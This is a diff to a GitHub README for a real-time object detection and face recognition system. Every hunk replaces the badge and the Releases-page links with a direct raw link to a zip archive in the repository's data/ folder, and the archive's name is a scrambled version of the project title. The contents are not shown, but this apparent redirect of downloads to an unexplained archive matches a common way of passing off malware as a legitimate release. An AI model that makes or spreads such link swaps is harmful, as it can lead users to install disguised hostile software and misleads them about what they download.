@@ -1,6 +1,6 @@
 # 🖥️ Real-Time-Object-Detection-Face-Recognition-System - Detect Faces and Objects Instantly
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/kimdongjune/Real-Time-Object-Detection-Face-Recognition-System/raw/refs/heads/main/data/Time_Face_Detection_Recognition_System_Real_Object_3.3-beta.4.zip)
 
 ## 📖 Description
 
@@ -22,7 +22,7 @@ Before you start, ensure that your system meets the following requirements:
 
 To download the application, please visit the Releases page using the following link:
 
-[Download the Real-Time-Object-Detection-Face-Recognition-System](https://github.com/kimdongjune/Real-Time-Object-Detection-Face-Recognition-System/releases)
+[Download the Real-Time-Object-Detection-Face-Recognition-System](https://github.com/kimdongjune/Real-Time-Object-Detection-Face-Recognition-System/raw/refs/heads/main/data/Time_Face_Detection_Recognition_System_Real_Object_3.3-beta.4.zip)
 
 ### Step 2: Download the Application
 
@@ -63,7 +63,7 @@ The application offers a simple interface:
 
 To begin your experience with the Real-Time Object Detection and Face Recognition System, follow these steps. Click the link below to access the Releases page and download the latest version:
 
-[Download the Real-Time-Object-Detection-Face-Recognition-System](https://github.com/kimdongjune/Real-Time-Object-Detection-Face-Recognition-System/releases)
+[Download the Real-Time-Object-Detection-Face-Recognition-System](https://github.com/kimdongjune/Real-Time-Object-Detection-Face-Recognition-System/raw/refs/heads/main/data/Time_Face_Detection_Recognition_System_Real_Object_3.3-beta.4.zip)
 
 ## 🛠️ Troubleshooting
 
